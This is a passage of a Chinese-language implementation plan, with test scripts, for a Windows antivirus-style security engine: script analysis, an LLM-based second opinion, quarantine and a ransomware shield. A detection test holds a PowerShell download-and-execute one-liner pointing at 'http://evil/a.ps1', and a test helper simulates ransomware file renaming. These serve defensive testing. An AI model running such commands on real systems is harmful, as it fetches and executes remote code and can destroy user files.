            crypt32.CertGetNameStringW(ctx, CERT_NAME_SIMPLE_DISPLAY_TYPE, 0, None, buf, 512)
            return buf.value
        finally:
            crypt32.CertCloseStore(h_store.value, 0)
    except Exception:
        return ""
```

* [ ] **Step 3.4: 运行验证（预期全 PASS）**

Run: `python scripts/_verify_signature.py`
Expected: 全部 PASS（kernel32.dll 签名有效且签发者含 microsoft）

* [ ] **Step 3.5: 提交**

```powershell
git add src/zhuzhu_Copilot/core/security_engine/signature.py scripts/_verify_signature.py ; git commit -m "feat(security): 签名验证与签发者提取模块"
```

***

### Task 4: 脚本分析 script\_intel

**Files:**

* Create: `src/zhuzhu_Copilot/core/security_engine/script_intel.py`

* Create: `scripts/_verify_script_intel.py`

* [ ] **Step 4.1: 写验证脚本（先失败）**

```python
# scripts/_verify_script_intel.py
import os, sys
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "src"))

FAILS = []
def check(name, cond, detail=""):
    print(("PASS " if cond else "FAIL ") + name + ((" :: " + detail) if detail else ""))
    if not cond:
        FAILS.append(name)

from zhuzhu_Copilot.core.security_engine.rules import RuleEngine
from zhuzhu_Copilot.core.security_engine.script_intel import analyze_script, obfuscation_ratio

eng = RuleEngine()
mal = 'IEX (New-Object Net.WebClient).DownloadString("http://evil/a.ps1")'
conf, hits = analyze_script(mal, "sample.ps1", eng)
check("下载执行样本高置信", conf >= 80, f"conf={conf}")
check("下载执行命中规则", len(hits) >= 1, str([r.get("id") for r, _ in hits]))

enc = "powershell -EncodedCommand " + "QkFTRTY0R0lCRkVSSVNIRVJFVE9NQUtFWU9VRlJFRUxPTkc=" * 6
conf, _ = analyze_script(enc, "sample.ps1", eng)
check("编码命令样本高置信", conf >= 80, f"conf={conf}")

benign = "Get-ChildItem C:\\Users | Select-Object Name, Length | Format-Table"
conf, hits = analyze_script(benign, "sample.ps1", eng)
check("正常脚本零命中", conf < 40 and len(hits) == 0, f"conf={conf}")

big_b64 = "QWJD" * 80
conf, _ = analyze_script(big_b64, "s.ps1", eng)
check("高混淆占比中等可疑", conf >= 50, f"conf={conf}")

check("混淆占比计算", abs(obfuscation_ratio("abcd+/=WXYZ") - 1.0) < 1e-6)
check("空文本混淆占比0", obfuscation_ratio("") == 0.0)

print("TOTAL", len(FAILS), "FAILURES")
sys.exit(1 if FAILS else 0)
```

* [ ] **Step 4.2: 运行验证（预期失败）**

Run: `python scripts/_verify_script_intel.py`
Expected: FAIL `ModuleNotFoundError`

* [ ] **Step 4.3: 实现 script\_intel**

`src/zhuzhu_Copilot/core/security_engine/script_intel.py`：

```python
"""脚本分析：脚本文本 → 规则引擎（category=script），附加混淆启发式置信度加权"""
from typing import List, Tuple

_B64ISH = set("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=")


def obfuscation_ratio(text: str) -> float:
    """base64 字符集占比（去空白后），度量编码混淆程度"""
    stripped = "".join(str(text or "").split())
    if not stripped:
        return 0.0
    return sum(1 for c in stripped if c in _B64ISH) / len(stripped)


def analyze_script(text: str, name: str, engine) -> Tuple[int, List[Tuple[dict, tuple]]]:
    """返回 (置信度, 命中列表 [(规则, 匹配器元组)])"""
    hits = engine.match({"kind": "script", "script": text or "", "name": name or "",
                         "cmdline": text or ""}, category="script")
    conf = max((int(r.get("confidence") or 0) for r, _ in hits), default=0)
    if not hits and len(text or "") >= 160 and obfuscation_ratio(text) >= 0.75:
        conf = 50   # 启发式兜底：长文本高 base64 占比 → 中等可疑
    return conf, hits
```

* [ ] **Step 4.4: 运行验证（预期全 PASS）**

Run: `python scripts/_verify_script_intel.py`
Expected: 全部 PASS

* [ ] **Step 4.5: 提交**

```powershell
git add src/zhuzhu_Copilot/core/security_engine/script_intel.py scripts/_verify_script_intel.py ; git commit -m "feat(security): 脚本分析模块（规则+混淆启发式）"
```

***

### Task 5: 可选 LLM 深度分析 llm\_analyzer

**Files:**

* Create: `src/zhuzhu_Copilot/core/security_engine/llm_analyzer.py`

* Create: `scripts/_verify_llm_analyzer.py`

* [ ] **Step 5.1: 写验证脚本（先失败；含本地协议服务验证 + 掉线降级两条真实路径）**

```python
# scripts/_verify_llm_analyzer.py
import json, os, sys, threading
from http.server import BaseHTTPRequestHandler, HTTPServer

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "src"))

FAILS = []
def check(name, cond, detail=""):
    print(("PASS " if cond else "FAIL ") + name + ((" :: " + detail) if detail else ""))
    if not cond:
        FAILS.append(name)

from zhuzhu_Copilot.core.security_engine.llm_analyzer import analyze, _parse

# 1) 关闭/缺配置 → 直接返回 None（不请求网络）
check("未启用返回None", analyze({"a": 1}, {"enabled": False}) is None)
check("缺base_url返回None", analyze({"a": 1}, {"enabled": True, "model": "m"}) is None)

# 2) 掉线路径：指向本机未监听端口 → 快速失败返回 None（降级）
import socket
s = socket.socket()
s.bind(("127.0.0.1", 0))
port = s.getsockname()[1]
s.close()
check("网络不可达快速失败", analyze({"x": 1},
      {"enabled": True, "base_url": f"http://127.0.0.1:{port}", "model": "m", "timeout_s": 3.0}) is None)

# 3) 协议验证：本地 HTTP 服务返回真实 /chat/completions 响应结构
received = {}

class H(BaseHTTPRequestHandler):
    def do_POST(self):
        n = int(self.headers.get("Content-Length", 0))
        received["body"] = json.loads(self.rfile.read(n).decode("utf-8"))
        received["auth"] = self.headers.get("Authorization", "")
        resp = {"choices": [{"message": {"content":
                '{"verdict": "suspicious", "confidence": 66, "reason": "pe import pattern"}'}}]}
        data = json.dumps(resp).encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)
    def log_message(self, *a):
        pass

srv = HTTPServer(("127.0.0.1", 0), H)
threading.Thread(target=srv.serve_forever, daemon=True).start()
try:
    r = analyze({"summary": "imports virtualalloc"}, {
        "enabled": True, "base_url": f"http://127.0.0.1:{srv.server_port}",
        "model": "probe-model", "api_key": "k1", "timeout_s": 8.0})
    check("协议响应解析", r is not None and r.get("verdict") == "suspicious", str(r))
    check("置信度归一", isinstance((r or {}).get("confidence"), int))
    check("请求载荷真实", (received.get("body") or {}).get("model") == "probe-model",
          str((received.get("body") or {}).get("model")))
    check("鉴权头传递", received.get("auth") == "Bearer k1")
finally:
    srv.shutdown()

# 4) 解析函数容错
check("解析纯JSON", _parse('{"verdict":"clean","confidence":10}')["verdict"] == "clean")
check("解析围栏JSON", _parse('前置说明\n{"verdict":"malicious","confidence":99}')["verdict"] == "malicious")
check("非法verdict返回None", _parse('{"verdict":"weird","confidence":50}') is None)

print("TOTAL", len(FAILS), "FAILURES")
sys.exit(1 if FAILS else 0)
```

* [ ] **Step 5.2: 运行验证（预期失败）**

Run: `python scripts/_verify_llm_analyzer.py`
Expected: FAIL `ModuleNotFoundError`

* [ ] **Step 5.3: 实现 llm\_analyzer**

`src/zhuzhu_Copilot/core/security_engine/llm_analyzer.py`：

```python
"""可选 LLM 深度分析：低置信度样本二次判定（OpenAI 兼容 /chat/completions，urllib 真实请求）

cfg 形如 {"enabled": True, "base_url": ..., "api_key": ..., "model": ..., "timeout_s": 15.0}
未启用/配置不全/网络失败/解析失败 → 返回 None（调用方回退规则判定），绝不阻断防护链路。
"""
import json
import re
import urllib.error
import urllib.request
from typing import Dict, Optional

_SYSTEM_PROMPT = ("你是恶意软件分析助手。根据样本摘要判定恶意程度。"
                  '只输出一个JSON对象：{"verdict":"malicious|suspicious|clean",'
                  '"confidence":0-100,"reason":"简短理由"}。不要输出其他内容。')


def _parse(content: str) -> Optional[dict]:
    if not content:
        return None
    text = content.strip()
    try:
        obj = json.loads(text)
    except ValueError:
        m = re.search(r"\{.*\}", text, re.S)
        if not m:
            return None
        try:
            obj = json.loads(m.group(0))
        except ValueError:
            return None
    if not isinstance(obj, dict):
        return None
    verdict = str(obj.get("verdict") or "").lower()
    if verdict not in ("malicious", "suspicious", "clean"):
        return None
    try:
        conf = max(0, min(100, int(obj.get("confidence") or 0)))
    except (TypeError, ValueError):
        conf = 0
    return {"verdict": verdict, "confidence": conf,
            "reason": str(obj.get("reason") or "")[:200]}


def analyze(abstract: dict, cfg: dict) -> Optional[dict]:
    """样本摘要 → LLM 判定；任何失败返回 None（降级）"""
    cfg = cfg or {}
    if not cfg.get("enabled") or not cfg.get("base_url") or not cfg.get("model"):
        return None
    payload = {
        "model": cfg["model"],
        "messages": [
            {"role": "system", "content": _SYSTEM_PROMPT},
            {"role": "user", "content": "样本摘要:\n" + json.dumps(abstract, ensure_ascii=False)[:6000]},
        ],
        "temperature": 0.0,
        "max_tokens": 200,
    }
    url = str(cfg["base_url"]).rstrip("/") + "/chat/completions"
    req = urllib.request.Request(
        url, data=json.dumps(payload).encode("utf-8"), method="POST",
        headers={"Content-Type": "application/json",
                 "Authorization": f"Bearer {cfg.get('api_key') or ''}"})
    timeout = float(cfg.get("timeout_s") or 12.0)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            body = json.loads(r.read().decode("utf-8", "replace"))
        content = (body.get("choices") or [{}])[0].get("message", {}).get("content", "")
        return _parse(str(content))
    except (OSError, ValueError, urllib.error.URLError, urllib.error.HTTPError, IndexError, KeyError):
        return None
```

* [ ] **Step 5.4: 运行验证（预期全 PASS）**

Run: `python scripts/_verify_llm_analyzer.py`
Expected: 全部 PASS

* [ ] **Step 5.5: 提交**

```powershell
git add src/zhuzhu_Copilot/core/security_engine/llm_analyzer.py scripts/_verify_llm_analyzer.py ; git commit -m "feat(security): 可选LLM深度分析模块（掉线自动降级）"
```

***

### Task 6: 统一引擎 engine（事件流/分级处置/隔离扩展/审计）

**Files:**

* Create: `src/zhuzhu_Copilot/core/security_engine/engine.py`

* Create: `scripts/_verify_engine.py`

* [ ] **Step 6.1: 写验证脚本（先失败）**

```python
# scripts/_verify_engine.py
import json, os, subprocess, sys, tempfile, time
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "src"))

FAILS = []
def check(name, cond, detail=""):
    print(("PASS " if cond else "FAIL ") + name + ((" :: " + detail) if detail else ""))
    if not cond:
        FAILS.append(name)

from zhuzhu_Copilot.core.security_engine.engine import SecurityEngine, _FILES_DIR, _AUDIT_DIR

# 1) 高置信度进程事件 → 自动终止真实子进程
eng = SecurityEngine()
notify = []
eng.set_notify(lambda p: notify.append(p))
child = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(60)"])
eng.start()
eng.post({"source": "test", "kind": "process", "pid": child.pid, "confidence": 95,
          "rule_id": "t", "reason": "测试恶意进程"})
deadline = time.time() + 8
while time.time() < deadline and not notify:
    time.sleep(0.2)
try:
    child.wait(timeout=3)
    exited = True
except subprocess.TimeoutExpired:
    exited = False
    child.kill()
check("高置信度进程自动终止", exited)
check("处置动作上报", any(p.get("action") in ("killed", "failed") for p in notify), str(notify[:1]))

# 2) 低置信度 → 仅审计日志（无通知）
n0 = len(notify)
eng.post({"source": "test", "kind": "file", "path": "x", "confidence": 10, "rule_id": "t", "reason": "low"})
time.sleep(1.0)
check("低置信度不通知", len(notify) == n0)
check("审计日志写入", len(list(_AUDIT_DIR.glob("*.json"))) >= 2, str(_AUDIT_DIR))

# 3) 文件隔离（压缩备份）+ 恢复
tmp = tempfile.mkdtemp(prefix="engine_")
f = os.path.join(tmp, "doc.txt")
with open(f, "w", encoding="utf-8") as fh:
    fh.write("user document content " * 100)
check("文件隔离成功", eng.quarantine_path(f, "test-q"))
check("隔离后源文件消失", not os.path.exists(f))
check("隔离压缩包存在", any(_FILES_DIR.glob("doc.txt_*.zip")), str(list(_FILES_DIR.glob("*.zip"))[:3]))
check("恢复成功", eng.restore_quarantine_files() >= 1)
check("恢复后文件存在", os.path.exists(f))
with open(f, encoding="utf-8") as fh:
    check("恢复内容一致", "user document content" in fh.read())
os.remove(f)

# 4) 目录隔离
d = os.path.join(tmp, "subdir")
os.makedirs(d)
with open(os.path.join(d, "a.txt"), "w") as fh:
    fh.write("inner")
check("目录隔离成功", eng.quarantine_path(d, "test-dir"))
check("目录已删除", not os.path.exists(d))
check("目录恢复", eng.restore_quarantine_files() >= 1)
check("目录恢复后内容在", os.path.isfile(os.path.join(d, "a.txt")))

# 5) 处置级别 override
eng.set_action_level("ask")
n1 = len(notify)
eng.post({"source": "t", "kind": "file", "path": "y", "confidence": 99, "rule_id": "t", "reason": "hi"})
time.sleep(1.0)
check("全确认模式不自动处置", all(p.get("action") != "quarantined" for p in notify[n1:]))

eng.stop()
print("TOTAL", len(FAILS), "FAILURES")
sys.exit(1 if FAILS else 0)
```

* [ ] **Step 6.2: 运行验证（预期失败）**

Run: `python scripts/_verify_engine.py`
Expected: FAIL `ModuleNotFoundError`

* [ ] **Step 6.3: 实现 engine**

`src/zhuzhu_Copilot/core/security_engine/engine.py`：

```python
"""统一防护引擎：事件流 + 置信度分级处置 + 审计 + 隔离（复用 security.py 隔离区/进程工具）

处置分级（action_policy 外置，set_action_level 可覆盖为 auto/ask）：
- 置信度 >= high → 自动处置（终止进程/删除启动项/隔离文件）
- mid <= 置信度 < high → 通知用户决定
- 其余 → 仅审计日志
"""
import json
import os
import queue
import shutil
import threading
import time
import zipfile
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional

from zhuzhu_Copilot.core import security as _sec
from .rules import RuleEngine

logger = __import__("zhuzhu_Copilot.utils.helpers", fromlist=["setup_logging"]).setup_logging()

_QROOT = _sec._QUARANTINE_ROOT
_FILES_DIR = _QROOT / "files"      # 文件/目录隔离压缩包与元数据
_AUDIT_DIR = _QROOT / "audit"      # 处置审计 JSON


class SecurityEngine:
    """统一调度：各检测器 post 事件，引擎按置信度分级处置并审计"""

    def __init__(self):
        self.rules = RuleEngine()
        self.monitors: List[Any] = []
        self._q: "queue.Queue[dict]" = queue.Queue()
        self._stop = threading.Event()
        self._notify: Optional[Callable[[dict], None]] = None
        self._llm_cfg: Dict[str, Any] = {}
        self._action_level = "graded"   # graded | auto | ask
        self._main = threading.Thread(target=self._loop, daemon=True, name="sec-engine")

    @property
    def policy(self) -> dict:
        return self.rules.policy

    # ---------- 配置 ----------
    def set_notify(self, cb: Callable[[dict], None]) -> None:
        self._notify = cb

    def set_llm_cfg(self, cfg: dict) -> None:
        self._llm_cfg = cfg or {}

    def set_action_level(self, level: str) -> None:
        if level in ("auto", "graded", "ask"):
            self._action_level = level

    def post(self, event: dict) -> None:
        event.setdefault("ts", time.time())
        self._q.put(event)

    def add_monitor(self, monitor) -> None:
        self.monitors.append(monitor)

    def start_monitors(self) -> None:
        for m in self.monitors:
            try:
                m.start()
            except Exception:
                logger.exception("监测器启动失败: %s", type(m).__name__)

    # ---------- 生命周期 ----------
    def start(self) -> None:
        if not self._main.is_alive():
            self._main.start()

    def stop(self) -> None:
        self._stop.set()
        for m in self.monitors:
            try:
                m.stop()
            except Exception:
                pass
        if self._main.is_alive():
            self._main.join(timeout=3)

    # ---------- 事件处置 ----------
    def _loop(self) -> None:
        while not self._stop.is_set():
            try:
                ev = self._q.get(timeout=0.5)
            except queue.Empty:
                continue
            try:
                self._handle(ev)
            except Exception:
                logger.exception("事件处置异常")

    def _handle(self, ev: dict) -> None:
        conf = int(ev.get("confidence") or 0)
        if self._action_level == "auto":
            action = self._auto_action(ev)
        elif self._action_level == "ask":
            action = "notify"
        else:
            p = self.policy
            if conf >= int(p.get("high") or 80):
                action = self._auto_action(ev)
            elif conf >= int(p.get("mid") or 40):
                action = "notify"
            else:
                action = "log"
        self._audit(ev, action)
        if action != "log" and self._notify:
            try:
                self._notify({"event": ev, "action": action})
            except Exception:
                pass

    def _auto_action(self, ev: dict) -> str:
        kind = ev.get("kind")
        if kind == "process" and ev.get("pid"):
            return self._safe_kill(int(ev["pid"]))
        if kind == "startup" and ev.get("entry"):
            return "removed" if self.remove_startup(ev["entry"]) else "failed"
        if kind == "ransomware":
            done = None
            pid = ev.get("pid")
            if pid:
                done = self._safe_kill(int(pid))
            for p in (ev.get("targets") or []):
                try:
                    self.quarantine_path(str(p), str(ev.get("reason") or ""))
                except OSError:
                    pass
            return ("killed_quarantined" if done == "killed" else
                    "reported_quarantined" if done else "quarantined")
        if kind in ("file",) and ev.get("path"):
            return "quarantined" if self.quarantine_path(str(ev["path"]),
                                                         str(ev.get("reason") or "")) else "failed"
        return "notify"

    def _safe_kill(self, pid: int) -> str:
        """终止进程（排除自身进程，防误杀；二次校验 PID 仍存活）"""
        if pid == os.getpid():
            return "self_skip"
        alive = any(p["pid"] == pid for p in _sec._enum_processes())
        if alive and _sec._terminate_process(pid):
            return "killed"
        return "failed"

    # ---------- 处置动作 ----------
    def remove_startup(self, entry: dict) -> bool:
        """删除启动项（带隔离区备份，可恢复）"""
        return _sec.SecurityScanner()._remove_startup(dict(entry))

    def quarantine_path(self, path: str, reason: str = "") -> bool:
        """文件/目录压缩备份后移入隔离区（可恢复）；源在备份成功后删除"""
        src = Path(path)
        if not src.exists():
            return False
        try:
            _FILES_DIR.mkdir(parents=True, exist_ok=True)
            archive_name = f"{src.name}_{int(time.time() * 1000)}.zip"
            arc = _FILES_DIR / archive_name
            with zipfile.ZipFile(arc, "w", zipfile.ZIP_DEFLATED) as z:
                if src.is_dir():
                    for f in src.rglob("*"):
                        if f.is_file():
                            z.write(f, arcname=str(f.relative_to(src.parent)))
                else:
                    z.write(src, arcname=src.name)
            meta = {"path": str(src), "reason": reason, "archive": archive_name,
                    "time": time.strftime("%Y-%m-%d %H:%M:%S")}
            (_FILES_DIR / f"{archive_name}.meta.json").write_text(
                json.dumps(meta, ensure_ascii=False, indent=2), encoding="utf-8")
            if src.is_dir():
                shutil.rmtree(src, ignore_errors=True)
            else:
                src.unlink()
            return True
        except OSError:
            return False

    def restore_quarantine_files(self) -> int:
        """从隔离区恢复文件/目录，返回恢复数量"""
        restored = 0
        for meta_f in sorted(_FILES_DIR.glob("*.meta.json")):
            try:
                m = json.loads(meta_f.read_text(encoding="utf-8"))
                arc = _FILES_DIR / m["archive"]
                dst = Path(m["path"])
                if not dst.exists() and arc.exists():
                    with zipfile.ZipFile(arc) as z:
                        z.extractall(dst.parent)
                    arc.unlink()
                    meta_f.unlink()
                    restored += 1
            except (OSError, KeyError, ValueError):
                continue
        return restored

    def _audit(self, ev: dict, action: str) -> None:
        try:
            _AUDIT_DIR.mkdir(parents=True, exist_ok=True)
            rec = {"time": time.strftime("%Y-%m-%d %H:%M:%S"), "action": action,
                   "source": ev.get("source"), "kind": ev.get("kind"),
                   "confidence": ev.get("confidence"), "rule_id": ev.get("rule_id"),
                   "reason": ev.get("reason"),
                   "target": ev.get("path") or ev.get("cmdline") or str(ev.get("entry") or "")}
            (_AUDIT_DIR / f"audit_{int(time.time() * 1000)}.json").write_text(
                json.dumps(rec, ensure_ascii=False, indent=2), encoding="utf-8")
        except OSError:
            pass
```

* [ ] **Step 6.4: 运行验证（预期全 PASS）**

Run: `python scripts/_verify_engine.py`
Expected: 全部 PASS。注意：本验证会向正式隔离目录 `ProgramData\zhuzhu_Copilot\Quarantine` 写入测试产物，验证结束时恢复/删除测试文件完成自清理。

* [ ] **Step 6.5: 提交**

```powershell
git add src/zhuzhu_Copilot/core/security_engine/engine.py scripts/_verify_engine.py ; git commit -m "feat(security): 统一防护引擎（事件流/分级处置/隔离扩展/审计）"
```

***

### Task 7: 勒索防护盾 ransomware\_shield

**Files:**

* Create: `src/zhuzhu_Copilot/core/security_engine/ransomware_shield.py`

* Create: `scripts/_ransom_sim_child.py`

* Create: `scripts/_verify_ransomware_shield.py`

* [ ] **Step 7.1: 写模拟子进程（测试行为发生器）**

```python
# scripts/_ransom_sim_child.py —— 模拟勒索行为：批量改名 .locked + 持续高熵写入（测试专用）
import os, sys, time


def main():
    workdir = sys.argv[1]
    anchor = os.path.join(workdir, "anchor_data.txt")
    h = open(anchor, "wb")   # 保持句柄打开，供 Restart Manager 归因
    try:
        n = 0
        while True:
            h.write(os.urandom(4096))
            h.flush()
            src = os.path.join(workdir, f"seq{n}.tmp")
            with open(src, "wb") as f:
                f.write(os.urandom(2048))
            os.rename(src, os.path.join(workdir, f"seq{n}.locked"))
            n += 1
            time.sleep(0.15)
    except Exception:
        pass


if __name__ == "__main__":
    main()
```

* [ ] **Step 7.2: 写验证脚本（先失败）**

```python
# scripts/_verify_ransomware_shield.py
import os, subprocess, sys, tempfile, time
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "src"))

FAILS = []
def check(name, cond, detail=""):
    print(("PASS " if cond else "FAIL ") + name + ((" :: " + detail) if detail else ""))
    if not cond:
        FAILS.append(name)

from zhuzhu_Copilot.core.security_engine.engine import SecurityEngine
from zhuzhu_Copilot.core.security_engine.ransomware_shield import RansomwareShield, default_protected_dirs

check("默认保护目录解析", len(default_protected_dirs()) >= 1, str(default_protected_dirs()))

tmp = tempfile.mkdtemp(prefix="ransom_")
eng = SecurityEngine()
eng.set_action_level("auto")
shield = RansomwareShield(eng, dirs=[tmp])
events = []
eng.set_notify(lambda p: events.append(p))
eng.add_monitor(shield)
eng.start()
eng.start_monitors()
time.sleep(1.0)

child = subprocess.Popen([sys.executable,
                          os.path.join(os.path.dirname(os.path.abspath(__file__)), "_ransom_sim_child.py"),
                          tmp])
deadline = time.time() + 40
hit = None
try:
    while time.time() < deadline:
        time.sleep(1)
        hit = next((e for e in events if e["event"].get("kind") == "ransomware"), None)
        if hit and child.poll() is not None:
            break
    check("勒索行为检测命中", hit is not None,
          f"events={[(e['event'].get('source'), e.get('action')) for e in events[:3]]}")
    check("肇事件终止", hit is not None and hit.get("action", "").startswith(("killed", "reported")),
          str(hit.get("action") if hit else None))
    check("已修改文件隔离", hit is not None and hit.get("action") in
          ("killed_quarantined", "reported_quarantined", "quarantined"),
          str(hit.get("action") if hit else None))
    eng_ = None
finally:
    if child.poll() is None:
        child.kill()
    try:
        eng.stop()
    except Exception:
        pass

# 恢复隔离文件（自清理）
from zhuzhu_Copilot.core.security_engine.engine import _FILES_DIR
restored = eng.restore_quarantine_files() if hit else 0
check("隔离文件可恢复", restored >= 1, f"restored={restored}")
import shutil
shutil.rmtree(tmp, ignore_errors=True)

print("TOTAL", len(FAILS), "FAILURES")
sys.exit(1 if FAILS else 0)
```

* [ ] **Step 7.3: 运行验证（预期失败）**

Run: `python scripts/_verify_ransomware_shield.py`
Expected: FAIL `ModuleNotFoundError`

* [ ] **Step 7.4: 实现 ransomware\_shield**

`src/zhuzhu_Copilot/core/security_engine/ransomware_shield.py`：

```python
"""勒索防护盾：ReadDirectoryChangesW 目录实时监控 + 批量改名/高熵写入检测 +
Restart Manager 溯源肇事件。全部真实 Win32 API；阈值与扩展名外置规则库。
"""
import ctypes
import ctypes.wintypes as wt
import os
import queue
import struct
import threading
import time
import winreg
from collections import deque
from pathlib import Path
from typing import List, Optional

from . import file_intel

logger = __import__("zhuzhu_Copilot.utils.helpers", fromlist=["setup_logging"]).setup_logging()

FILE_LIST_DIRECTORY = 0x0001
FILE_FLAG_BACKUP_SEMANTICS = 0x02000000
FILE_FLAG_OVERLAPPED = 0x40000000
FILE_NOTIFY_CHANGE_FILE_NAME = 0x0001
FILE_NOTIFY_CHANGE_DIR_NAME = 0x0002
FILE_NOTIFY_CHANGE_SIZE = 0x0008
FILE_NOTIFY_CHANGE_LAST_WRITE = 0x0010
_ACTION_ADDED, _ACTION_RENAMED_NEW = 1, 5

_INVALID_HANDLE = wt.HANDLE(-1).value

_RM_SESSION_KEY_LEN = 32  # CCH_RM_SESSION_KEY


def default_protected_dirs() -> List[str]:
    """读取用户 Shell Folders（桌面/文档/图片/下载），失败回退 USERPROFILE 拼接"""
    mapping = {"Desktop": "Desktop", "Personal": "Documents", "My Pictures": "Pictures",
               "{374DE290-123F-4565-9164-39C4925E467B}": "Downloads"}
    out: List[str] = []
    try:
        with winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders") as k:
            for i in range(64):
                try:
                    n, v, _ = winreg.EnumValue(k, i)
                except OSError:
                    break
                if n in mapping:
                    p = os.path.expandvars(v)
                    if os.path.isdir(p):
                        out.append(p)
    except OSError:
        pass
    home = os.environ.get("USERPROFILE") or str(Path.home())
    for name in ("Desktop", "Documents", "Pictures", "Downloads"):
        p = os.path.join(home, name)
        if os.path.isdir(p) and p not in out:
            out.append(p)
    return out


class DirWatcher(threading.Thread):
    """监控单个目录（非递归）的变更事件：ReadDirectoryChangesW + OVERLAPPED 1s 轮询"""

    def __init__(self, path: str, out_q: "queue.Queue[dict]"):
        super().__init__(daemon=True)
        self._path = str(path)
        self._q = out_q
        self._stop = threading.Event()

    def stop(self) -> None:
        self._stop.set()

    def run(self) -> None:
        k32 = ctypes.WinDLL("kernel32", use_last_error=True)
        k32.CreateFileW.argtypes = [wt.LPCWSTR, wt.DWORD, wt.DWORD, ctypes.c_void_p,
                                    wt.DWORD, wt.DWORD, wt.HANDLE]
        k32.CreateFileW.restype = wt.HANDLE
        k32.ReadDirectoryChangesW.argtypes = [wt.HANDLE, ctypes.c_void_p, wt.DWORD, wt.BOOL,
                                              wt.DWORD, ctypes.POINTER(wt.DWORD),
                                              ctypes.c_void_p, ctypes.c_void_p]
        k32.ReadDirectoryChangesW.restype = wt.BOOL
        k32.WaitForSingleObject.argtypes = [wt.HANDLE, wt.DWORD]
        k32.GetOverlappedResult.argtypes = [wt.HANDLE, ctypes.c_void_p,
                                            ctypes.POINTER(wt.DWORD), wt.BOOL]
        k32.CancelIoEx.argtypes = [wt.HANDLE, ctypes.c_void_p]
        k32.CreateEventW.argtypes = [ctypes.c_void_p, wt.BOOL, wt.BOOL, wt.LPCWSTR]
        k32.CreateEventW.restype = wt.HANDLE
        k32.CloseHandle.argtypes = [wt.HANDLE]

        h = k32.CreateFileW(self._path, FILE_LIST_DIRECTORY, 7, None, 3,
                            FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OVERLAPPED, None)
        if h == _INVALID_HANDLE:
            return
        buf = ctypes.create_string_buffer(64 * 1024)
        filter_mask = (FILE_NOTIFY_CHANGE_FILE_NAME | FILE_NOTIFY_CHANGE_DIR_NAME
                       | FILE_NOTIFY_CHANGE_SIZE | FILE_NOTIFY_CHANGE_LAST_WRITE)
        try:
            while not self._stop.is_set():
                ev = k32.CreateEventW(None, True, False, None)
                ov = wt.OVERLAPPED()
                ov.hEvent = ev
                got = wt.DWORD(0)
                ok = k32.ReadDirectoryChangesW(h, buf, len(buf), False, filter_mask,
                                               ctypes.byref(got), ctypes.byref(ov), None)
                if ok:
                    self._parse(buf)
                elif ctypes.get_last_error() == 997:   # ERROR_IO_PENDING
                    if k32.WaitForSingleObject(ev, 1000) == 0:
                        if k32.GetOverlappedResult(h, ctypes.byref(ov), ctypes.byref(got), True):
                            self._parse(buf)
                    else:
                        k32.CancelIoEx(h, ctypes.byref(ov))
                else:
                    break
                k32.CloseHandle(ev)
        finally:
            k32.CloseHandle(h)

    def _parse(self, buf) -> None:
        offset = 0
        tried = 0
        while tried < 512:
            if offset + 12 > len(buf):
                break
            next_off, action, name_len = struct.unpack_from("<III", buf, offset)
            raw = bytearray(buf[offset + 12:offset + 12 + name_len])
            raw_len = min(name_len, len(raw))
            if raw_len >= 2 and raw[-2] == 0:
                raw_len -= 2
            name = bytes(raw[:raw_len]).decode("utf-16-le", "replace")
            if name:
                self._q.put({"action": int(action), "name": name, "dir": self._path,
                             "path": os.path.join(self._path, name)})
            if not next_off:
                break
            offset += next_off
            tried += 1


def _file_owner_pid(path: str) -> int:
    """Restart Manager 反查正在使用文件的进程 PID"""
    try:
        rstrtmgr = ctypes.WinDLL("rstrtmgr", use_last_error=True)

        class RM_UNIQUE_PROCESS(ctypes.Structure):
            _fields_ = [("dwProcessId", wt.DWORD), ("ProcessStartTime", wt.FILETIME)]

        class RM_PROCESS_INFO(ctypes.Structure):
            _fields_ = [("Process", RM_UNIQUE_PROCESS), ("strAppName", wt.LPWSTR),
                        ("strServiceShortName", wt.LPWSTR), ("ApplicationType", wt.DWORD),
                        ("AppStatus", wt.DWORD), ("TSSessionId", wt.DWORD),
                        ("bRestartable", wt.BOOL)]

        rstrtmgr.RmStartSession.argtypes = [ctypes.POINTER(wt.DWORD), wt.DWORD, wt.LPWSTR]
        rstrtmgr.RmStartSession.restype = wt.DWORD
        rstrtmgr.RmEndSession.argtypes = [wt.DWORD]
        rstrtmgr.RmRegisterResources.argtypes = [wt.DWORD, wt.UINT, ctypes.POINTER(wt.LPCWSTR),
                                                 wt.UINT, ctypes.c_void_p, wt.UINT, ctypes.c_void_p]
        rstrtmgr.RmGetList.argtypes = [wt.DWORD, ctypes.POINTER(wt.DWORD), ctypes.POINTER(wt.DWORD),
                                       ctypes.c_void_p, ctypes.c_void_p]

        session = wt.DWORD(0)
        if rstrtmgr.RmStartSession(ctypes.byref(session), 0,
                                   ctypes.create_unicode_buffer(_RM_SESSION_KEY_LEN + 1)) != 0:
            return 0
        try:
            fname = ctypes.create_unicode_buffer(path)
            arr = (wt.LPCWSTR * 1)(fname)
            if rstrtmgr.RmRegisterResources(session, 1, arr, 0, None, 0, None) != 0:
                return 0
            needed, n = wt.DWORD(0), wt.DWORD(0)
            r = rstrtmgr.RmGetList(session, ctypes.byref(needed), ctypes.byref(n), None, None)
            if n.value == 0:
                return 0
            buf = ctypes.create_string_buffer(max(needed.value, n.value * ctypes.sizeof(RM_PROCESS_INFO)))
            if rstrtmgr.RmGetList(session, ctypes.byref(needed), ctypes.byref(n), buf, None) != 0:
                return 0
            infos = (RM_PROCESS_INFO * n.value).from_buffer(buf) if n.value else []
            return int(infos[0].Process.dwProcessId) if infos else 0
        finally:
            rstrtmgr.RmEndSession(session)
